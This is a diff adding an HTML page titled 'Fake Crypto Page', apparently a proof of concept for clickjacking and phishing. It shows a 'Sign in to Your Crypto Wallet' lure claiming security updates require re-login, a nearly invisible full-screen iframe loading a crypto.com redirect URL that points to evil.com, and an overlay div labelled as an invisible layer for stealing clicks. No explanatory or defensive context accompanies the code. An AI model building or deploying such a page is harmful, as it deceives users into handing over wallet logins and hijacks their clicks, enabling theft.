@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Fake Crypto Page</title>
+    <style>
+        iframe {
+            width: 100%;
+            height: 100vh;
+            position: absolute;
+            top: 0;
+            left: 0;
+            opacity: 0.1; /* Make it almost invisible */
+        }
+        .cover {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 10;
+        }
+    </style>
+</head>
+<body>
+    <h1>Sign in to Your Crypto Wallet</h1>
+    <p>Due to security updates, please log in again.</p>
+    <iframe src="https://js.crypto.com/api/redirect?url=https://evil.com"></iframe>
+    <div class="cover"></div>  <!-- Invisible layer for stealing clicks -->
+</body>
+</html>
